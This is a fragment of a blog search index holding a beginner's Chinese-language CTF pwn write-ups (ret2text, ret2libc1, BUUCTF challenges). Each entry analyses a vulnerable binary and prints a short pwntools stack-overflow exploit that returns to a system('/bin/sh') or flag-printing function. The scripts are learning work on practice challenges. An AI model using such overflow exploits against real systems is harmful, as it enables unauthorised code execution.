+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了<br><del>我这个flat（）还查了好久是什么意思……</del></p>
+<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>Q1:能不能直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处？<br>Q2：求一个plt表和got表的详细教学文章<del>（找了好几篇都不是看得很清楚）</del></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T2</title>
+    <url>/posts/d88d430d/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2text-上题的另一种解法"><a href="#T2-ret2text-上题的另一种解法" class="headerlink" title="T2 ret2text(上题的另一种解法)"></a>T2 ret2text(上题的另一种解法)</h2><blockquote>
+<p>2023-01-09WP<br>网上看到另一种暴力解法感觉很不错于是自己做过了一遍<br><strong>0x01</strong>与<strong>0x02</strong>跟上题相同</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>一个小<strong>疑问：</strong>这两种方法有优劣之分的吗？</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T1</title>
+    <url>/posts/418412b7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki基础rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"><br>求帮忙</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T5</title>
+    <url>/posts/545c7940/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-pwn1-sctf-2016"><a href="#T5-pwn1-sctf-2016" class="headerlink" title="T5 pwn1_sctf_2016"></a>T5 pwn1_sctf_2016</h2><blockquote>
+<p>2023-01-09WP<br>BUUCTF pwn第五题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit,开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-746f7f97d1877dc7901815486c36d846_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中shift+f12可以找到有个cat flag.txt<br><img data-src="https://pic1.zhimg.com/80/v2-9d38aa862b9408f86802c4dca80493a4_1440w.webp"><br>可以利用这个函数来输出flag<br>查看调用它的函数并记下它的地址0x8048F0D<br><img data-src="https://pic3.zhimg.com/v2-107e624689b731fc197a5f737bac2106_r.jpg"><br>继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数<br><img data-src="https://pic3.zhimg.com/80/v2-fc51095b6ef69a5c78254f87a3dcea9a_1440w.webp"><br>但是fget函数限制了输入长度为32，好像并不能构成栈溢出<br>于是我就蒙了，fget后面的伪代码又不是看得很懂……<br>查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you<br>这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的s<br>payload再覆盖掉ebp再加上get_flag函数的地址就可以了<br>最后看大佬博客半懂半不懂地写了个exp<br>（这篇<a href="https://www.freebuf.com/vuls/336623.html">博客</a>感觉算是比较详细的，它甚至是直接分析汇编语言）</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)</span><br><span class="line">flag_addre = 0x08048F0D</span><br><span class="line">payload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>还是不是很懂到底是怎么看出来是把i换成you的<br>还有就是这个replace函数的参数列表中那个v4代表的是什么<br><img data-src="https://pic3.zhimg.com/80/v2-cc78aea540c7bae381b3cfe547853dae_1440w.webp"><br>并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了<br><del>直接点进去看replace的源码好像又不科学，根本看不懂……</del></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T4</title>
+    <url>/posts/235b49d6/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
+<p>2023-01-08WP<br>BUUCTF pwn第四题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
+<p><del>直接写11.28125好像没用……</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>网上看到一篇<a href="https://blog.csdn.net/qq_41560595/article/details/108783758">博客</a>是直接从IDA中找十六进制数的<br>pwn得flag<br>还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>这就让我有<strong>一些疑惑：</strong>就这一题来说，开启了NX有没有让题目难度增加呢？</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T3</title>
+    <url>/posts/bd3fdc75/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
+<p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
+<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
+<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T2</title>
+    <url>/posts/ca38ece3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-rip"><a href="#T2-rip" class="headerlink" title="T2 rip"></a>T2 rip</h2><blockquote>
+<p>2023-01-04WP<br>BUUCTF pwn第二题<br>考点：简单的栈溢出</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>查看保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>啥都没开，非常nice</p>
+<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>file后是64位，扔到IDA里<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里<br><del>Function window直接找也行….</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>直接f5大法<br>main函数里好像没啥用<br>看到char了一个s数组还有get函数，栈溢出无疑了<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行<br>于是找出fun函数中调用system的地址0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>有了地址，现在需要知道的是s的长度，在IDA中可以找到<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address</p>
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……</del><br>执行脚本得到flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
+<h3 id="0x04-small-questions"><a href="#0x04-small-questions" class="headerlink" title="0x04 small questions"></a>0x04 small questions</h3><p>1.双击数组s进入的这个窗口是怎么看的<br><img data-src="https://pic4.zhimg.com/80/v2-0a7d690c55ddb11f03cb5dbcf0bc4123_1440w.webp"><br>2.怎么看出来s的内存空间是紧挨着rbp的呢？</p>
+<h3 id="0x05-补充一些知识"><a href="#0x05-补充一些知识" class="headerlink" title="0x05 补充一些知识"></a>0x05 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week1 T1</title>
+    <url>/posts/5331bd59/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
+<p>2023-01-03WP<br>BUUCTF pwn第一题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="一、用checksec检测文件保护机制"><a href="#一、用checksec检测文件保护机制" class="headerlink" title="一、用checksec检测文件保护机制"></a>一、用checksec检测文件保护机制</h3><p>下载文件，checksec得知已开启NX保护<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位）</p>
+<h3 id="二、打开IDA"><a href="#二、打开IDA" class="headerlink" title="二、打开IDA"></a>二、打开IDA</h3><p>将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……)</del></p>
+<h3 id="三、结合题目提示可知直接nc"><a href="#三、结合题目提示可知直接nc" class="headerlink" title="三、结合题目提示可知直接nc"></a>三、结合题目提示可知直接nc</h3><p><del>（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）</del><br>ls列出文件目录<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
+<h3 id="四、一些疑问"><a href="#四、一些疑问" class="headerlink" title="四、一些疑问"></a>四、一些疑问</h3><p>1.为什么我的checksec只能横着一排显示过去？打开文件时为什么只能用checksec –file&#x3D;而不能checksec file?（网上查找过资料没有解决方法）<br>2.用peda自带的checksec为什么用两种格式打开文件会出现不同的结果呢？<br><img data-src="https://pic4.zhimg.com/80/v2-39e1446cefe516e40009a8526e953467_1440w.webp"></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
   </entry>
 </search>
